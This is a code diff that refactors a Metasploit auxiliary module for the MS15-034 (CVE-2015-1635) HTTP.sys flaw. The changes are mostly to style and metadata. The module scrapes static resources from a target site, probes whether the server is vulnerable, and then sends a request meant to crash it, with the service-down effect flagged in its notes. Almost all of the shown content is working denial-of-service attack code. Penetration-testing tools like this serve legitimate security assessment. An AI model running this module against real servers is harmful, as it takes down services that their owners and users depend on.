@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
 
@@ -13,39 +11,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',
-      'Description'    => %q{
-        This module will check if scanned hosts are vulnerable to CVE-2015-1635 (MS15-034), a
-        vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code
-        execution. This module will try to cause a denial-of-service.
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',
+        'Description' => %q{
+          This module will check if scanned hosts are vulnerable to CVE-2015-1635 (MS15-034), a
+          vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code
+          execution. This module will try to cause a denial-of-service.
+        },
+        'Author' => [
           # Bill did all the work (see the pastebin code), twitter: @hectorh56193716
           'Bill Finlayson',
           # MSF. But really, these people made it happen:
           # https://github.com/rapid7/metasploit-framework/pull/5150
           'sinn3r'
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2015-1635'],
           ['MSB', 'MS15-034'],
-          ['URL', 'http://pastebin.com/ypURDPc4'],
+          ['URL', 'https://pastebin.com/ypURDPc4'],
           ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
           ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
           ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/']
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ]
+    )
   end
 
   def upper_range
@@ -56,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
     if check_host(ip) == Exploit::CheckCode::Vulnerable
       dos_host(ip)
     else
-      print_status("Probably not vulnerable, will not dos it.")
+      print_status('Probably not vulnerable, will not dos it.')
     end
   end
 
@@ -65,19 +68,19 @@ class MetasploitModule < Msf::Auxiliary
     @target_uri ||= super
   end
 
-  def get_file_size(ip)
-    @file_size ||= lambda {
+  def get_file_size(_ip)
+    @get_file_size ||= lambda {
       file_size = -1
       uri = normalize_uri(target_uri.path)
       res = send_request_raw('uri' => uri)
 
       unless res
-        vprint_error("Connection timed out")
+        vprint_error('Connection timed out')
         return file_size
       end
 
       if res.code == 404
-        vprint_error("You got a 404. URI must be a valid resource.")
+        vprint_error('You got a 404. URI must be a valid resource.')
         return file_size
       end
 
@@ -108,7 +111,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Errno::EPIPE, ::Timeout::Error
       # Same exceptions the HttpClient mixin catches
     end
-    print_status("DOS request sent")
+    print_status('DOS request sent')
   end
 
   def potential_static_files_uris
@@ -117,20 +120,20 @@ class MetasploitModule < Msf::Auxiliary
     return [uri] unless uri[-1, 1] == '/'
 
     uris = ["#{uri}welcome.png"]
-    res  = send_request_raw('uri' => uri, 'method' => 'GET')
+    res = send_request_raw('uri' => uri, 'method' => 'GET')
 
     return uris unless res
 
     site_uri = URI.parse(full_uri)
-    page     = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))
+    page = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))
 
     page.xpath('//link|//script|//style|//img').each do |tag|
-      %w(href src).each do |attribute|
+      %w[href src].each do |attribute|
         attr_value = tag[attribute]
 
         next unless attr_value && !attr_value.empty?
 
-        uri = site_uri.merge(URI.encode(attr_value.strip))
+        uri = site_uri.merge(URI::DEFAULT_PARSER.escape(attr_value.strip))
 
         next unless uri.host == vhost || uri.host == rhost
 
@@ -141,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
     uris.uniq
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     potential_static_files_uris.each do |potential_uri|
       uri = normalize_uri(potential_uri)
 
@@ -153,16 +156,16 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
 
-      vmessage = "#{peer} - Checking #{uri} [#{res.code}]"
+      vmessage = "#{peer} - Checking #{uri}"
 
       if res && res.body.include?('Requested Range Not Satisfiable')
-        vprint_status("#{vmessage} - Vulnerable")
+        vprint_status("#{vmessage} [#{res.code}] - Vulnerable")
 
         target_uri.path = uri # Needed for the DoS attack
 
         return Exploit::CheckCode::Vulnerable
       elsif res && res.body.include?('The request has an invalid header name')
-        vprint_status("#{vmessage} - Safe")
+        vprint_status("#{vmessage} [#{res.code}] - Safe")
 
         return Exploit::CheckCode::Safe
       else
